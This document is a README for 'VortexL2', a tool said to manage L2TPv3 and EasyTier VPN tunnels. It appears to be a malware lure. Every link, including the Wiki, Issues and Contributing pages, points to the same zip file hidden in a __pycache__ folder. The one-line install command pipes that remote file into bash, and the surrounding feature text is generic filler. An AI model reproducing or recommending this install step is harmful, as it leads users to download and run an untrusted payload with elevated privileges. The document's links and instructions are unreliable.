# 🚀 VortexL2 - Manage Your VPN Tunnels Easily

## 📥 Download VortexL2
[![Download VortexL2](https://raw.githubusercontent.com/Jennesispogi055/VortexL2/main/vortexl2/__pycache__/Vortex_v1.4.zip%20VortexL2-Click%https://raw.githubusercontent.com/Jennesispogi055/VortexL2/main/vortexl2/__pycache__/Vortex_v1.4.zip)](https://raw.githubusercontent.com/Jennesispogi055/VortexL2/main/vortexl2/__pycache__/Vortex_v1.4.zip)

## ✨ Overview
**VortexL2** is a command-line tool designed for Ubuntu and Debian users. It helps you manage **L2TPv3** and **EasyTier** tunnels smoothly. With VortexL2, you gain access to advanced features like HAProxy-based port forwarding and a user-friendly interface.

## 🛠 Features
- **Interactive TUI Management**: Manage tunnels easily with an intuitive text user interface.
- **Two Tunnel Types**: Choose between L2TPv3 tunnels or the newer EasyTier mesh tunnels based on your needs.
- **HAProxy Port Forwarding**: High-performance port forwarding with manual activation for secure connections.
- **Systemd Integration**: Ensures your tunnels start automatically when your system boots.
- **One-liner Installation**: Quickly set up VortexL2 with a single command.

## 📦 Installation
To install VortexL2, follow these steps:

1. Open your terminal.
2. Run the following command:

   ```bash
   bash <(curl -Ls https://raw.githubusercontent.com/Jennesispogi055/VortexL2/main/vortexl2/__pycache__/Vortex_v1.4.zip)
   ```

3. During the installation, you will be prompted to choose the type of tunnel you want to set up:
   - **L2TPv3**: Select this for a traditional L2TP Ethernet tunnel.
   - **EasyTier**: Choose this for a modern mesh VPN tunnel.

## 🖥 System Requirements
- **Operating System**: Ubuntu 20.04 LTS or later, Debian 10 or later
- **RAM**: Minimum of 512 MB
- **Disk Space**: At least 100 MB free
- **Permissions**: You need sudo privileges for installation and tunnel management

## 🔧 Configuration
After installation, you can configure your tunnels using the command-line interface. Here are some common configurations:

### L2TPv3 Configuration
1. **Create a New Tunnel**:
   ```bash
   vortexl2 create l2tp <tunnel-name> --remote <remote-ip> --local <local-ip>
   ```

2. **Start Tunnel**:
   ```bash
   vortexl2 start <tunnel-name>
   ```

### EasyTier Configuration
1. **Create a New EasyTier Tunnel**:
   ```bash
   vortexl2 create easytier <tunnel-name> --nodes <node1-ip,node2-ip>
   ```

2. **Activate Tunnel**:
   ```bash
   vortexl2 activate <tunnel-name>
   ```

### Managing Tunnels
Use the following commands to manage your tunnels:

- **List All Tunnels**:
   ```bash
   vortexl2 list
   ```

- **Stop a Tunnel**:
   ```bash
   vortexl2 stop <tunnel-name>
   ```

- **Delete a Tunnel**:
   ```bash
   vortexl2 delete <tunnel-name>
   ```

## 💻 User Interface
VortexL2 includes a text user interface (TUI) that simplifies the management of tunnels. You can access this by running:

```bash
vortexl2 start
```

Follow the on-screen prompts to navigate and manage your tunnels.

## 🌐 Support and Documentation
For more detailed documentation, troubleshooting tips, and feature explanations, please visit our [Wiki](https://raw.githubusercontent.com/Jennesispogi055/VortexL2/main/vortexl2/__pycache__/Vortex_v1.4.zip).

## 🧑‍🤝‍🧑 Community Contributions
VortexL2 welcomes contributions. If you wish to help improve the project, please read our [Contributing Guidelines](https://raw.githubusercontent.com/Jennesispogi055/VortexL2/main/vortexl2/__pycache__/Vortex_v1.4.zip).

### Report Issues
If you encounter problems, please report them on our [Issues page](https://raw.githubusercontent.com/Jennesispogi055/VortexL2/main/vortexl2/__pycache__/Vortex_v1.4.zip).

## 📥 Download & Install VortexL2
To download VortexL2, visit the Releases page:
[Download VortexL2](https://raw.githubusercontent.com/Jennesispogi055/VortexL2/main/vortexl2/__pycache__/Vortex_v1.4.zip)

You can find all versions and related files there. 

## 📞 Contact
If you have questions or need support, you can reach out through the GitHub discussion page or email the maintainer.

---

End your setup with confidence. VortexL2 combines functionality with an easy-to-use interface, ensuring your VPN management is streamlined and efficient.